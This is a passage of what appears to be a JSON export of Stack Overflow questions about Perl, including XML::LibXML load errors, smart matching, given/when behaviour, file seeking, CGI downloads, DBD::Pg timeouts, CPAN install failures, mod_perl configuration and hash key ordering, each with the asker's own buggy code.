build.</p>\n"},{"tags":["xml","perl","xml-parsing","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12779400,"title":"Can't load '/usr/lib/perl5/vendor_perl/5.8/msys/auto/XML/LibXML/Common/Common.dll' for module XML::LibXML::Common: dlopen: Win32 error 126","body":"<p>I'm stuck with this error:</p>\n\n<pre><code>Can't load '/usr/lib/perl5/vendor_perl/5.8/msys/auto/XML/LibXML/Common/Common.dll' for module XML::LibXML::Common: dlopen: Win32 error 126 at /usr/lib/perl5/5.8\n/msys/DynaLoader.pm line 230.\n at /usr/lib/perl5/vendor_perl/5.8/msys/XML/LibXML.pm line 12\nCompilation failed in require at /usr/lib/perl5/vendor_perl/5.8/msys/XML/LibXML.pm line 12.\nBEGIN failed--compilation aborted at /usr/lib/perl5/vendor_perl/5.8/msys/XML/LibXML.pm line 12.\n\nCompilation failed in require at script.pl line 5.    \nBEGIN failed--compilation aborted at script.pl line 5.\n</code></pre>\n\n<p>while loading a perl script which uses <code>XML::Libxml</code>.</p>\n\n<p>It worked perfectly last week, so I'm sure I don't have any syntax error or path error.</p>\n\n<p>I can't read the error nor understand it....</p>\n\n<p>Here is my script, very simple :</p>\n\n<pre><code>    #!/usr/bin/perl\n    use utf8; \n    use strict;\n    use warnings;\n    use XML::LibXML;\n    require \"D:/Projets/Maroc Scada/Rabat 41 - Images T200i-DRR-F200C/script_PI/addresses.pl\";\n\n    my $Filepath = \"D:/Projets/Maroc Scada/Rabat 41 - Images T200i-DRR-F200C/script_PI/RTUS_originaux\";     # Must contain a \"treated\" subdirectory to store results\n    my $parser;         # LibXML object used to read the text file .xml\n    my $xmldoc;         # XML document parsed, ready to use with libxml API\n    my $i = 0;          # treated elements per file\n    my $j = 0;          # treated files\n    my $RTUName;        # Name of the current RTU\n    my $RTUType;        # Type of the RTU. matching the key in %address hash table in addresses.pl\n    my $MeasureName;    # Current Measure Name (for printing in console)\n    my $Parameters;     # parameters to apply to on the node. Typically a hash containing key-&gt;values of the parameters to be updated as { \"MonitorTcAddress\" =&gt; \"11\", ... }\n    my $v = 0;          # 1 for more debug information. If 0, only errors and message \"end of program\"\n\n    # Get the files in the given directory and loop on all xml files exported from PowerCC\n    print \"Beginning of program...\\n\";\n    opendir(DIR, $Filepath);\n    my @FILES= readdir(DIR); \n    foreach my $File (@FILES) {\n\n        if ($File =~ m/.xml/) {   #  m/.xml$/\n            print \"Opening \".$File.\"\\n\" if $v;\n            $j++;\n            $parser = XML::LibXML-&gt;new();\n            $xmldoc = $parser-&gt;parse_file($Filepath.\"/\".$File);\n\n\n            #  Loop on all nodes in xml file to place the default addresses (IOA) \n            #  and the types of the measurements in the RTYType defined in \n            #  the hash in address.pl\n\n            # Loop on all RTUs\n            for my $rtu ($xmldoc-&gt;findnodes('/XDF/Instances/Parent/CfeSubRemoteTerminalUnit')) {\n                $RTUName = $rtu-&gt;getAttribute(\"Name\");\n                $RTUType = $rtu-&gt;getAttribute(\"Description\");\n                if (length($RTUType) &lt; 2) { print \"[ERROR 002] : Type of RTU is not defined for RTU=\".$RTUName.\"   Type=\".$RTUType.\"\\n\"; }\n                print \"RTUName=\".$RTUName . \", Type=\". $RTUType. \"\\n\"  if $v;\n\n                # Chosing IEC 101 and address structure 24 bits\n                $rtu-&gt;setAttribute(\"TeleControlProtocolType\", \"1\");\n                $rtu-&gt;setAttribute(\"DataPointAddressStructure\", \"4\");\n\n\n                # Looking for all Analog measurements\n                for my $Measure ($rtu-&gt;findnodes('CfeTelemeteredAnalog')) { \n                    $MeasureName = $Measure-&gt;getAttribute(\"Name\");\n                    $Parameters = getAddress($MeasureName, $RTUType);\n\n                    if ($$Parameters{\"RemoveFromPI\"}) {             # Special. Point is in PI but doesn't exist in reality -&gt; removing from XML.\n                        print \"[SPECIAL 005] : Removing node \".$MeasureName.\" from XML file.\\n\" if $v;\n                        $Measure-&gt;unbindNode();\n                    }\n                    else {\n                        # Overwrite all parameters in the Hash $adresses on the attributes of the current node.\n                        foreach my $Param (keys %$Parameters)  {\n                            $Measure-&gt;setAttribute( $Param, $$Parameters{$Param} );\n                            print \" \".$MeasureName.\" :      \".$Param.\" =&gt;   \".$$Parameters{$Param}.\"\\n\" if $v;\n                        }\n                        $i++;\n                    }\n                } # Analog Iteration\n\n\n                # Looking for all Digital Status. Same structure. Duplicated code iterating on digital nodes\n                for my $Measure ($rtu-&gt;findnodes('CfeTelemeteredDigital')) { \n                    $MeasureName = $Measure-&gt;getAttribute(\"Name\");\n                    $Parameters = getAddress($MeasureName, $RTUType);\n\n                    if ($$Parameters{\"RemoveFromPI\"}) {             # Special. Point is in PI but doesn't exist in reality -&gt; removing from XML.\n                        print \"[SPECIAL 006] : Removing node \".$MeasureName.\" from XML file.\\n\" if $v;\n                        $Measure-&gt;unbindNode();\n                    }\n                    else {\n                        # Overwrite all parameters in the Hash $adresses on the attributes of the current node.\n                        foreach my $Param (keys %$Parameters)  {\n                            $Measure-&gt;setAttribute( $Param, $$Parameters{$Param} );\n                            print \" \".$MeasureName.\" :      \".$Param.\" =&gt;   \".$$Parameters{$Param}.\"\\n\"   if $v;\n                        }\n                        $i++;\n                    }\n                } # Digital iteration\n\n\n            } # RTU iteration\n\n\n\n            # write the xml tree to a text file\n            open (MYFILE, '&gt;'.$Filepath.'/treated/'.$File);\n            print MYFILE $xmldoc-&gt;toString(1);\n            close (MYFILE); \n            print \"Closing \".$File.\". Treated elements = \".$i.\"\\n\"  if $v;\n        } # if . or ..\n    } # loop on files in directory\n\n    print \"End of Program. \".$j.\" XML files treated, \".$i.\" elements.\\n\";\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":12651385,"title":"Reversing the Operand of Smart Matching operator doesn't give same result","body":"<p>I am facing a strange problem here in the working of <code>Smart Matching Operator</code>.. </p>\n\n<p>I have read that the order of operand while using the <code>Smart Matching Operator(~~)</code> doesn't matter, and it gives the same result.. But in an example which I have shown below, this doesn't work..</p>\n\n<p>I want to check whether an element is amongst one of the elements of a given array or not..\n<br/>Below are the two ways I tried : -</p>\n\n<p><strong>First way: -</strong> ($result ~~ @nums)</p>\n\n<pre><code>#!/perl/bin\nuse v5.14;\n\nmy @nums = qw( 1 2 3 27 42 );\nmy $result = 27;\n\nsay \"The result [$result] is one of the input values (@nums)\" if $result ~~ @nums;\n</code></pre>\n\n<p><strong>Second way: -</strong> (@nums ~~ $result)</p>\n\n<pre><code>#!/perl/bin\nuse v5.14;\n\nmy @nums = qw( 1 2 3 27 42 );\nmy $result = 27;\n\nsay \"The result [$result] is one of the input values (@nums)\" \\\n                                 if @nums ~~ $result;\n</code></pre>\n\n<p>However, the first way is working fine, and it is printing the statement, but in the second way, it is not printing..</p>\n\n<p>i.e. : - <strong><code>@nums ~~ $result</code></strong> is not giving the same result as <strong><code>$result ~~ @nums</code></strong></p>\n\n<p>I can't understand why this is happening..<br>\n<br/>Can anyone help me. I am unable to find this problem on SO.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12652047,"title":"default statement is always executed if the last `when` statement is false in `foreach-when` statements","body":"<p>In my program I am passing a list of <code>file names</code> from command-line to my program, and checking whether each file is - <code>executable</code>, <code>readable</code> and <code>writable</code>..</p>\n\n<p>I am using <code>foreach-when</code> statement for the above problem.. But there seems to be some problem in the use of <code>when</code> and <code>default</code> statements, which may be I'm not using correctly, but its giving me unexpected result..</p>\n\n<p>Here's my code: - </p>\n\n<pre><code>#!/perl/bin\nuse v5.14;\nuse warnings;\n\nforeach (@ARGV) {\n    say \"*************Checking file $_ *******************\";\n    when (-r $_) { say \"File is Readable\"; continue; }\n    when (-w $_) { say \"File is Writable\"; continue; }   # This condition is true\n    when (-x $_) { say \"File is Executable\" }   # This condition is false\n    default      { say \"None of them\" }      # Executed\n}\n</code></pre>\n\n<p>I have added a <code>continue</code>, only to the first two <code>when</code> to make perl check for all the conditions regardless of the name of the file.. </p>\n\n<p>Also, I haven't added a <code>continue</code> to the second last <code>when</code>, because I only want my <code>default</code> to be executed if none of the <code>when</code> is executed..</p>\n\n<p>The problem here is, if the <strong>last <code>when</code> condition is false</strong>, it will not enter the block, and then <strong>it goes on to execute the <code>default</code></strong> even though <strong>my first two <code>when</code> statements are satisfied.</strong> </p>\n\n<p>I checked the reason of this problem by changing the order of my <code>when</code>, and saw that if only the last <code>when</code> is executed, it will see that there is no <code>continue</code>, and hence it will not execute the <code>default</code> statement..</p>\n\n<p>So, in the above code, I have swapped <code>-x</code> and <code>-r</code>.. My file is readable, so last <code>when</code> in this case will be executed.. And then my <code>default</code> statement is not executed..</p>\n\n<pre><code>#!/perl/bin\nuse v5.14;\nuse warnings;\n\nforeach (@ARGV) {\n    say \"*************Checking file $_ *******************\";\n    when (-x $_) { say \"File is Executable\"; continue; }\n    when (-w $_) { say \"File is Writable\"; continue; }\n    when (-r $_) { say \"File is Readable\" }   # This condition is true\n    default      { say \"None of them\" }   # Not executed\n}\n</code></pre>\n\n<p>So, I want to ask, how to handle these kinds of situation.. I want it to work like the way for which <code>given-when</code> statement was added to Perl.. <br/>It should check all the <code>when</code>, and skip the <code>default</code> if at least one <code>when</code> is executed.. </p>\n"},{"tags":["perl","seek"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12779186,"title":"Perl - Move Pointer to Start of Line","body":"<p>I have 2 files.</p>\n\n<ol>\n<li>Obfuscated file called input.txt</li>\n<li>A second file called mapping.txt consisting of key value pairs.</li>\n</ol>\n\n<p>I want to find every occurrence of the key from mapping.txt in input.txt and replace it with the value corresponding to the key.</p>\n\n<p>Please note that I want to overwrite the contents of the line in input.txt everytime a successful match occurs.</p>\n\n<p>I have written the following code:</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse strict;\nuse warnings;\n\n(my $mapping,my $input)=@ARGV;\n\nopen(MAPPING,'&lt;',$mapping) || die(\"couldn't read from the file, $mapping with error: $!\\n\");\n\nwhile(&lt;MAPPING&gt;)\n{\n    chomp $_;\n    my $line=$_;\n    (my $key,my $value)=split(\"=\",$line);\n    open(INPUT,'+&lt;',$input);\n    while(&lt;INPUT&gt;)\n    {\n        chomp $_;\n        if(index($_,$key)!=-1)\n        {\n            $_=~s/\\Q$key/$value/g;\n            # move pointer to beginning of line\n           print INPUT $_.\"\\n\";\n        }\n    }\n    close INPUT;\n}\nclose MAPPING;\n</code></pre>\n\n<p>Brief Overview of the code:</p>\n\n<ol>\n<li>Opens the mapping.txt file in read mode.</li>\n<li>Since each line is a key value pair, it splits it into key and value.</li>\n<li>Opens the input.txt file in overwrite mode.</li>\n<li>Checks if the key is found in the current line.</li>\n<li>If the key is found, then substitute the key with the value ignoring any meta characters in the key (by prefixing \\Q)</li>\n<li>At this point, the file pointer would be at the end of the line since the previous statement would scan the entire line to find the key and replace it.</li>\n<li><p>If I could move the file pointer to the start of the line, then I can overwrite with:</p>\n\n<p>print INPUT $_,\"\\n\"</p></li>\n<li>I tried looking up the seek function however unable to figure out a way to use it for this purpose.</li>\n</ol>\n\n<p>Once this is done, then the code will close the file. It will pick the next key value pair from mapping.txt and again scan the input file from beginning looking for matches and replacing them.</p>\n\n<p>The most important point is, each time the inner while loop will be operating on the input.txt which was modified in the previous iteration of inner while loop. This way, any successful Find and Replace operations would keep on getting saved in the input.txt file.</p>\n\n<p>How do I do this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","sql-server-2008"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12777325,"title":"How to write sql result into csv file","body":"<p>I'm having two tables like A and B. Table A having the Columns Name. Table B having the Columns Company Name.</p>\n\n<p>This is my code:</p>\n\n<pre><code>$query1 = \"SELECT Name FROM A\"; \n$query2 = \"SELECT Company Name FROM B\"; \n\n$statement1 = $connection-&gt;prepare($query1);    \n$statement2 = $connection-&gt;prepare($query2);\n\n$statement1-&gt;execute();\n$statement2&gt;execute();\n\nwhile ( ($name) = $statement-&gt;fetchrow_array) {\n    push (@Name, $name);    \n} \nwhile ( ($companyname) = $statement-&gt;fetchrow_array) {\n    push (@companyName, $companyname);  \n}\n\nopen (FH, \"&gt;&gt;Output.csv\") or die \"$!\";\n</code></pre>\n\n<p>I need to write the data in the csv file like this</p>\n\n<pre><code>Name   CompanyName\n\nxxx     yyyy\n\nxxx     yyyy\n\nxxx     yyyy\n\nxxx     yyyy\n\nxxx     yyyy\n</code></pre>\n"},{"tags":["perl","escaping"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12779075,"title":"Escape characters in Perl","body":"<p>A stupid question.</p>\n\n<p>I'm trying to search and replace <code>\"$option\"&gt;$option_translated</code> with <code>$option&gt;$option_translated</code>.</p>\n\n<p>When I'm executing this command in unix terminal it's working fine.</p>\n\n<pre><code>sed -i 's/\"$option\"&gt;$option_translated/$option&gt;$option_translated/g' filename.txt\n</code></pre>\n\n<p>But when I uses it in my Perl script it doesn't work</p>\n\n<pre><code>my $cmd = (\"sed -i 's/\"$option\"&gt;$option_translated/$option&gt;$option_translated/g' $filename\");\nqx{$cmd};\n</code></pre>\n\n<p>I think some characters need to be escaped here. Let me know which are those. Thanks.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12778656,"title":"Downloading a file through PERL script","body":"<p>I have the below PERL script that tries to download a file that contains the output of that script.</p>\n\n<p>I face an error which says:</p>\n\n<blockquote>\n  <p>Can't call method \"header\" on an undefined value at C:/Apache24/cgi-bin/trim.pl</p>\n</blockquote>\n\n<p>However my output file gets written properly at the right destination. Please help me out with fixing the code and get the output file downloaded.</p>\n\n<pre><code>use strict;\nuse CGI;\nuse CGI::Carp qw ( fatalsToBrowser );\nuse File::Basename;\n\nmy $q            = new CGI;\nmy $upload_dir   = \"C:/Apache24/htdocs/files\" ;\nmy ($bytesread, $buffer);\nmy $numbytes     = 1024;\nmy $trim_out_dir = \"C:/Users/Admin/Desktop/vijay/Metagenomics/NGSQCToolkit_v2.3/CGI_Out\";\nmy $out_file     = \"$trim_out_dir/trimmed.fasta\";\nmy $safe_filename_characters = \"a-zA-Z0-9_.-\";\n\n$q-&gt;cgi_error and error( $q, \"Error transferring file: \" . $q-&gt;cgi_error );\n\nmy $file         = $q-&gt;param( \"seq\" )     || error( $q, \"No file received.\" );\nmy $length       = $q-&gt;param( \"len\");\nmy $quality      = $q-&gt;param( \"qual\");\n\nopen ( UPLOADFILE, \"&gt;$upload_dir/$file\" ) or die \"$!\";\n\nwhile ($bytesread = read($file, $buffer, $numbytes)) { \n    print UPLOADFILE $buffer; \n} \n\nclose UPLOADFILE;\nsystem(\"Reads.pl -i $upload_dir/$file -n $length -o $out_file\");\nopen ( DOWNLOADFILE, \"&lt;$out_file\" ) or die \"$!\";\n\nprint $cgi-&gt;header(\n    -type       =&gt; 'application/octet-stream'\n    -attachment =&gt; '$out_file');\n\nclose DOWNLOADFILE;\n</code></pre>\n"},{"tags":["perl","file-handling"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12775521,"title":"Writing and reading of a File in a Perl program","body":"<p>I have an original file <strong>A.txt</strong>.\nI write to <strong>A_Copy.txt</strong>.\nI want to know if I can read <strong>A_Copy.txt</strong> before closing and after closing it in the same program?\nI want to modify <strong>A_Copy.txt</strong> using  <code>Tie::File</code> in the same program.</p>\n\n<p>A -> A_Copy.txt</p>\n\n<p>Read A_Copy.txt before closing</p>\n\n<p>Read A_Copy.txt after closing</p>\n\n<p>Modify A_Copy.txt</p>\n"},{"tags":["perl","google-chrome"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12778554,"title":"Chrome browser doesnot execute my perl programs","body":"<p>I have a <code>perl</code> website which is opening fine with IE browser. But when i try to open the site in chrome browser, it downloads the file instead of executing.</p>\n\n<p>How to configure chrome browser to support <code>perl</code> files?</p>\n"},{"tags":["perl","signals","dbi"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":346,"score":3,"question_id":3898867,"title":"How can I get DBD::Pg to time out reliably?","body":"<p>Why doesn't this code execute the signal handler until after $sth->execute completes?  And more importantly, how can I fix it?</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse DBI;\nuse Sys::SigAction qw( set_sig_handler );\n\nmy $dbh = DBI-&gt;connect('dbi:Pg:dbname=dc');\n\neval {\n    my $h = set_sig_handler('ALRM', sub { die \"timeout\\n\" });\n    eval {\n        alarm 1;\n        my $sth = $dbh-&gt;prepare(\"SELECT pg_sleep(10)\");\n        print \"Before execute\\n\";\n        $sth-&gt;execute;\n        print \"After execute\\n\";\n        $sth-&gt;finish;\n    };\n    alarm 0;\n    die \"$@\" if $@;\n};\ndie \"$@\" if $@;\nprint \"Finished\\n\";\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12775894,"title":"matching substrings on same line","body":"<p>I have a file which looks like this:</p>\n\n<pre><code>a_12_3_5- k_3_4_6-a_12_3_5-\nq_1_5_7_9- q_1_5_7_9-\na_9_4_5-c_3_4_6- c_3_4_6-r_4_5_7-\nb_1_1_3- v_1_5_7-\nd_12_4_5-e_4_5_6- g_5_6_7-d_6_8_6-\nb_1_1_7-f_3_8_7_8-d_4_1_4- d_4_1_5-b_1_1_7-f_3_8_3\nb_1_1_7-f_3_8_7_8-d_4_1_4- e_3_3_1-f_3_8_7-f_21_3_1-b_1_1_7-a_1_1_1-\n</code></pre>\n\n<p>This is a space-separated file. The strings appearing before and after the space is made up of smaller substrings, namely b_1_1_3- , k_3_4_6-, b_12_4_5- etc. I have to check how many of the smaller substrings on the Left side of the space are contained in the string appearing on right side of the space.\nFor eg: The 1st line has the substring a_12_3_5- which is present in the string on the right hand side. The 2nd line shows exact match with the right side. 3rd line however shows that there is only one substring on the left side (c_3_4_6-) which is contained in the string on the right side. 4th and 5th lines represent cases wherein no substring on left side is contained in the string on right side. Next line shows that there is only one substring (b_1_1_7-) that is contained in the string on right side. The last line shows that there are 2 substrings b_1_1_7- and f_3_8_7- which are contained in the string on the right hand side. \nThus effectively, I want to see how many of the substrings on the left hand side are contained in the string on the right hand side. I am trying to get the output in the following manner, such that each line in my file is appended with three numbers i.e number of substrings in left side, number of substrings in right side, no.of substrings on left side that are contained in the right side.</p>\n\n<pre><code>a_12_3_5- k_3_4_6-a_12_3_5- 1 2 1 \nq_1_5_7_9- q_1_5_7_9- 1 1 1\na_9_4_5-c_3_4_6- c_3_4_6-r_4_5_7- 2 2 1\nb_1_1_3- v_1_5_7- 1 1 0\nd_12_4_5-e_4_5_6- g_5_6_7-d_6_8_6- 2 2 0\nb_1_1_7-f_3_8_7_8-d_4_1_4- d_4_1_5-b_1_1_7-f_3_8_3- 3 3 1\nb_1_1_7-f_3_8_7_8-d_4_1_4- e_3_3_1-f_3_8_7-f_21_3_1-b_1_1_7-a_1_1_1- 3 5 2\n</code></pre>\n\n<p>I have so far been able to get the above output , but cant seem to get upto the last portion of the line. I have tried using perl pos and index functions. \nPLease help. </p>\n"},{"tags":["perl","sqlite","unicode","utf-8"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12776192,"title":"DBD::SQLite: sqlite_unicode Pragma","body":"<p>When I connect with DBI/DBD::SQLite to a sqlite database without setting the <code>sqlite_unicode</code> pragma, is then used the <code>sqlite_unicode</code> setting the database was created with?</p>\n"},{"tags":["perl","orm","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12772906,"title":"Construct DBIx::Class object and related objects but save later","body":"<p>I would like to construct a DBIx::Class object and its related objects but defer saving the object, calling the <code>insert</code> method on the object later and at that time have everything saved all at once.</p>\n\n<p>Here is example code based on the examples from the DBIx::Class documentation (artist, cd, etc.).</p>\n\n<pre><code>use MyApp::Schema;\nuse Data::Dumper ;\n\nsub make_artist_from_some_other_object\n{\n  my ($object, $schema) = @_ ; \n\n  my $artist = $schema-&gt;resultset('Artist')-&gt;new({});\n  $artist-&gt;name($object-&gt;firstname() . ' ' . $object-&gt;lastname()) ;\n\n  $artist-&gt;new_related('cds', {'title' =&gt; $object-&gt;firsttitle(), \n                               'year'  =&gt; $object-&gt;firstyear()}) ;\n  $artist-&gt;new_related('cds', {'title' =&gt; $object-&gt;secondtitle(), \n                               'year'  =&gt; $object-&gt;secondyear()}) ;\n  $artist-&gt;new_related('cds', {'title' =&gt; $object-&gt;thirdtitle(), \n                               'year'  =&gt; $object-&gt;thirdyear()}) ;\n  return $artist ;\n}\n\nmy $schema = MyApp::Schema-&gt;connect('dbi:SQLite:dbname=/tmp/abcd.sqlite');\n$artist = make_artist_from_some_other_object($some_object, $schema) ;\n$artist-&gt;insert() ;\n# The insert does _not_ save cd information.\n</code></pre>\n\n<p>I realize there are ways around this, e.g., keeping the related objects around and then saving them individually, but what I am looking for is a built-in DBIx::Class way to do all the object construction beforehand and then do a single insert sometime later. Is this possible?</p>\n"},{"tags":["perl","apache","mod-perl"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12758600,"title":"Mod_Perl configuration for multiple domains","body":"<p>Reading the Mod_Perl module documentation, can we configure it on per domain basis, what I mean can we configure it to run on every domain or specific domain only.</p>\n\n<p>What I see in the docs is:</p>\n\n<blockquote>\n  <h3>Registry Scripts</h3>\n  \n  <p><em>To enable registry scripts add to httpd.conf:</em></p>\n\n<pre><code>Alias /perl/ /home/httpd/2.0/perl/\n&lt;Location /perl/&gt;\nSetHandler perl-script\nPerlResponseHandler ModPerl::Registry\nPerlOptions +ParseHeaders\nOptions +ExecCGI\n&lt;/Location&gt;\n</code></pre>\n  \n  <p>and now assuming that we have the following script:</p>\n\n<pre><code>#!/usr/bin/perl\nprint \"Content-type: text/plain\\n\\n\";\nprint \"mod_perl 2.0 rocks!\\n\";\n</code></pre>\n  \n  <p>saved in /home/httpd/httpd-2.0/perl/rock.pl. Make the script executable and readable by everybody:</p>\n\n<pre><code>% chmod a+rx /home/httpd/httpd-2.0/perl/rock.pl\n</code></pre>\n  \n  <p>Of course the path to the script should be readable by the server too. In the real world you probably want to have a tighter permissions, but for the purpose of testing, that things are working, this is just fine.</p>\n</blockquote>\n\n<p>From what I understand above, we can run Perl scripts only from one specific folder that we put the directive above. So the question again, can we make this directive per domain for all domains or for specific number of domains?</p>\n"},{"tags":["perl","make","install","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":159,"score":1,"question_id":12775094,"title":"Why does CPAN install fail when installing Scrappy?","body":"<p>I understand that it is missing dependencies but I thought that CPAN would install all the dependant modules automatically. Here is the error:</p>\n\n<pre><code>Test Summary Report\n-------------------\nt/00_load_scrappy.t                   (Wstat: 65280 Tests: 1 Failed: 1)\n  Failed test:  1\n  Non-zero exit status: 255\n  Parse errors: Bad plan.  You planned 12 tests but ran 1.\nt/00_test_function_back.t             (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_content.t          (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_control.t          (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_cookies.t          (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_crawl.t            (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_debug.t            (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_domain.t           (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/00_test_function_download.t         (Wstat: 512 Tests: 0 Failed: 0)\n  Non-zero exit status: 2\n  Parse errors: No plan found in TAP output\nt/01_load_scrappy.t                   (Wstat: 65280 Tests: 1 Failed: 1)\n  Failed test:  1\n  Non-zero exit status: 255\n  Parse errors: Bad plan.  You planned 8 tests but ran 1.\nFiles=39, Tests=2,  1 wallclock secs ( 0.08 usr  0.08 sys +  0.85 cusr  0.15 csys =  1.16 CPU)\nResult: FAIL\nFailed 10/39 test programs. 2/2 subtests failed.\nmake: *** [test_dynamic] Error 255\n  AWNCORP/Scrappy-0.94112090.tar.gz\n7 dependencies missing (String::TT,WWW::Mechanize,Web::Scraper,YAML::Syck,Template,HTML::TreeBuilder,Moose); additionally test harness failed\n  make test -- NOT OK\n//hint// to see the cpan-testers results for installing this module, try:\n  reports AWNCORP/Scrappy-0.94112090.tar.gz\nRunning make install\n  make test had returned bad status, won't install without force\nCould not read metadata file. Falling back to other methods to determine prerequisites\nFailed during this command:\n ROBIN/PadWalker-1.96.tar.gz                  : make NO\n ABW/Template-Toolkit-2.24.tar.gz             : make NO\n BOBTFISH/String-TT-0.03.tar.gz               : make_test NO 2 dependencies missing (PadWalker,Template); additionally test harness failed\n GAAS/HTML-Parser-3.69.tar.gz                 : make NO\n CJM/HTML-Tree-5.03.tar.gz                    : make_test NO 2 dependencies missing (HTML::Parser,HTML::Entities); additionally test harness failed\n MIROD/HTML-TreeBuilder-XPath-0.14.tar.gz     : make_test NO one dependency not OK (HTML::TreeBuilder); additionally test harness failed\n GAAS/libwww-perl-6.04.tar.gz                 : make_test NO 2 dependencies missing (HTML::HeadParser,HTML::Entities); additionally test harness failed\n MIYAGAWA/Web-Scraper-0.36.tar.gz             : make_test NO 4 dependencies missing (HTML::TreeBuilder::XPath,HTML::Entities,HTML::TreeBuilder,LWP); additionally test harness failed\n DOY/Package-Stash-XS-0.25.tar.gz             : make NO\n DROLSKY/Class-Load-XS-0.04.tar.gz            : make NO\n DOY/Moose-2.0604.tar.gz                      : make NO\n GAAS/HTML-Form-6.03.tar.gz                   : make_test NO one dependency not OK (HTML::TokeParser); additionally test harness failed\n JESSE/WWW-Mechanize-1.72.tar.gz              : make_test NO 7 dependencies missing (HTML::Form,LWP::UserAgent,HTML::TokeParser,HTML::Parser,HTML::HeadParser,HTML::TreeBuilder,LWP); additionally test harness failed\n TODDR/YAML-Syck-1.21.tar.gz                  : writemakefile NO '/usr/bin/perl Makefile.PL INSTALLDIRS=site' returned status 512\n AWNCORP/Scrappy-0.94112090.tar.gz            : make_test NO 7 dependencies missing (String::TT,WWW::Mechanize,Web::Scraper,YAML::Syck,Template,HTML::TreeBuilder,Moose); additionally test harness failed\n</code></pre>\n\n<p>Then I tried to install one of the dependant modules alone:</p>\n\n<pre><code>cpan[2]&gt; install PadWalker\nRunning install for module 'PadWalker'\nRunning make for R/RO/ROBIN/PadWalker-1.96.tar.gz\n  Has already been unwrapped into directory /root/.cpan/build/PadWalker-1.96-n6C9km\nCould not make: Unknown error\nRunning make test\n  Can't test without successful make\nRunning make install\n  Make had returned bad status, install seems impossible\n</code></pre>\n\n<p>Could someone point me in the right direction? I am root and it is Ubuntu 12.04.1 up to date as of now.</p>\n"},{"tags":["perl","cpan","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12773842,"title":"setting up the 'inc' directory for a dist using Module::Package","body":"<p>As an example, the CPAN distribution <code>Scalar-Does-0.006</code> uses <code>Module::Package</code> in its <code>Makefile.PL</code>, and the code for <code>Module::Package</code> resides in the sub-directory <code>inc</code> with files like:</p>\n\n<pre><code>inc/Module/AutoInstall.pm\ninc/Module/Install/AutoInstall.pm\ninc/Module/Install/AutoManifest.pm\ninc/Module/Install/Base.pm\n...\n</code></pre>\n\n<p>Question: If I want to use <code>Module::Package</code> for my own distribution, is there a convenient way to populate the <code>inc</code> directory with the files my distribution needs? I have <code>Module::Package</code> installed locally in my perl's site_perl directory.</p>\n\n<p>I can't seem to find the answer in the <code>Module::Package</code> docs.</p>\n\n<p>Answer: Just create your <code>Makefile.PL</code>, and running it (i.e. <code>perl Makefile.PL</code>) will populate the <code>inc</code> directory.</p>\n"},{"tags":["perl","hash"],"answer_count":5,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":201,"score":7,"question_id":12724071,"title":"Is it guaranteed anywhere in docs that hashes with same keys will also have same order?","body":"<p>There's not much guarantees about order of hash keys in Perl. Is there any mention in docs that I can't find that would say that as long as two hashes use exactly same keys, they will go in exactly same order?</p>\n\n<p>Short test seems to confirm that. Even if I generate some additional keys for internal key table between assigning to two different hashes, their keys are returned in same order:</p>\n\n<pre><code>my %aaa;\nmy %bbb;\nmy %ccc;\nmy %ddd;\n\n@aaa{qw(a b c d e f g h i j k l)}=();\n# Let's see if generating more keys for internal table matters\n@ccc{qw(m n o p q r s t u v w x)}=();\n@bbb{qw(a b c d e f g h i j k l)}=();\n# Just to test if different insertion order matters\n@ddd{qw(l k c d e f g h i j a)}=(); $ddd{b} = ();\n\nprint keys %aaa, \"\\n\";\nprint keys %bbb, \"\\n\";\nprint keys %ddd, \"\\n\";\n</code></pre>\n\n<p>However I wouldn't rely on udocumented behavior and only fact that can be easily found in docs is that <code>keys</code>, <code>values</code> and <code>each</code> all will use same 